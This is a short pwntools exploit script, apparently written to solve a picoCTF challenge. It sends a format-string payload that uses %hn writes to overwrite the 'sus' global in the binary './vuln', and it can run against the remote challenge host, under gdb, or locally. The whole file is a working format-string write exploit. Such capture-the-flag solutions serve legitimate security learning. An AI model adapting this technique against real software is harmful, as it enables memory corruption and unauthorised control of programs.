#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./vuln"
#libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("rhea.picoctf.net", 49666)
elif len(argv) >= 2 and argv[1] == "d":
    cmd = """
        b *main+95
    	c
    """
    p = gdb.debug(chall,cmd)
else:
    p = process(chall)

sus_addr = elf.symbols["sus"]
log.info("sus: " + hex(sus_addr))
payload = b"%26465c%18$hn"
payload += b"%1285c%19$hn"
payload += b'A' * (8 - (len(payload) % 8))
payload += p64(sus_addr + 2)
payload += p64(sus_addr)

p.sendlineafter(b'?', payload)

p.interactive()
